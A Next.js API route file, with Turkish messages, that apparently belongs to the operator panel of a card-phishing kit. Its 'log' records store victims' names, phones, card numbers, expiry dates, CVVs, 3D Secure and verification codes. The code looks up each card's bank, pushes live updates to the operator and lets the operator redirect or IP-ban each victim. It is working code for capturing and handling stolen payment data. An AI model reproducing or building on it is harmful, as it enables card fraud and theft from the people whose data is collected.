import { NextRequest, NextResponse } from 'next/server';
import connectDB from '@/lib/mongodb';
import { logsDb, settingsDb } from '@/lib/db';
import { enrichLogMetadata } from '@/lib/logEnrichment';
import { detectBankName, detectCardType } from '@/lib/cardUtils';
import { resolveInactiveRedirectUrl } from '@/lib/inactiveRedirect';
import { notifyLogDeleted, notifyLogUpdated } from '@/lib/ws/notifyLog';

export async function GET(request: NextRequest, { params }: { params: { id: string } }) {
  try {
    await connectDB();
    const log = await logsDb.findById(params.id);

    if (!log) {
      return NextResponse.json({ success: false, error: 'Log bulunamadı' }, { status: 404 });
    }

    const response = NextResponse.json({ success: true, data: log });
    response.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    response.headers.set('Pragma', 'no-cache');
    response.headers.set('Expires', '0');
    return response;
  } catch (error: any) {
    console.error('Log getirme hatası:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Log getirilemedi' },
      { status: 500 }
    );
  }
}

export async function PUT(request: NextRequest, { params }: { params: { id: string } }) {
  try {
    await connectDB();
    const body = await request.json();
    const existingLog = await logsDb.findById(params.id);

    if (!existingLog) {
      return NextResponse.json({ success: false, error: 'Log bulunamadı' }, { status: 404 });
    }

    const updateData: Record<string, unknown> = {};
    if (body.status !== undefined && body.status !== null) updateData.status = body.status;
    if (body.action !== undefined && body.action !== null) updateData.action = body.action;
    if (body.redirectTo !== undefined) {
      updateData.redirectTo = body.redirectTo === '' || body.redirectTo === null ? null : body.redirectTo;
    }
    if (body.redirectReason !== undefined) {
      updateData.redirectReason = body.redirectReason === '' || body.redirectReason === null ? null : body.redirectReason;
    }
    if (body.name !== undefined && body.name !== null) updateData.name = body.name;
    if (body.phone !== undefined && body.phone !== null) updateData.phone = body.phone;
    if (body.cardNumber !== undefined && body.cardNumber !== null) updateData.cardNumber = body.cardNumber;
    if (body.expiryDate !== undefined && body.expiryDate !== null) updateData.expiryDate = body.expiryDate;
    if (body.cvv !== undefined && body.cvv !== null) updateData.cvv = body.cvv;
    if (body.threeDCode !== undefined && body.threeDCode !== null) updateData.threeDCode = body.threeDCode;
    if (body.verificationCode !== undefined && body.verificationCode !== null) updateData.verificationCode = body.verificationCode;
    if (body.amount !== undefined && body.amount !== null) updateData.amount = body.amount;
    if (body.address !== undefined && body.address !== null) updateData.address = body.address;
    if (body.pageType !== undefined && body.pageType !== null) updateData.pageType = body.pageType;

    if (body.cardNumber) {
      updateData.bankName = detectBankName(body.cardNumber);
      updateData.cardType = detectCardType(body.cardNumber);
    } else if (existingLog.cardNumber && !existingLog.bankName) {
      updateData.bankName = detectBankName(existingLog.cardNumber);
      updateData.cardType = detectCardType(existingLog.cardNumber);
    }

    if (body.userAgent || !existingLog.deviceType) {
      Object.assign(updateData, enrichLogMetadata(request, {
        userAgent: body.userAgent,
        cardNumber: body.cardNumber || existingLog.cardNumber,
      }));
    }

    const isBanAction = body.action === 'Banla' || body.redirectReason === 'Banla';

    if (isBanAction && existingLog.ipAddress) {
      await settingsDb.banIp(existingLog.ipAddress);
      const settings = await settingsDb.get();
      updateData.status = updateData.status ?? 'Hata';
      updateData.action = updateData.action ?? 'Banla';
      updateData.redirectReason = updateData.redirectReason ?? 'Banla';
      updateData.redirectTo = resolveInactiveRedirectUrl(settings.inactiveRedirectUrl);
    }

    const log = await logsDb.updateById(params.id, updateData);

    if (!log) {
      return NextResponse.json({ success: false, error: 'Log bulunamadı' }, { status: 404 });
    }

    notifyLogUpdated(log);

    const response = NextResponse.json({ success: true, data: log });
    response.headers.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    response.headers.set('Pragma', 'no-cache');
    response.headers.set('Expires', '0');
    return response;
  } catch (error: any) {
    console.error('Log güncelleme hatası:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Log güncellenemedi' },
      { status: 500 }
    );
  }
}

export async function DELETE(_request: NextRequest, { params }: { params: { id: string } }) {
  try {
    await connectDB();
    const { deleted, deletedCount } = await logsDb.deleteLogEntry(params.id, { cascade: true });

    if (!deleted) {
      return NextResponse.json({ success: false, error: 'Log bulunamadı' }, { status: 404 });
    }

    notifyLogDeleted(params.id);

    return NextResponse.json({
      success: true,
      message: deletedCount > 1 ? `${deletedCount} log silindi` : 'Log silindi',
      deletedCount,
    });
  } catch (error: any) {
    console.error('Log silme hatası:', error);
    return NextResponse.json(
      { success: false, error: error.message || 'Log silinemedi' },
      { status: 500 }
    );
  }
}
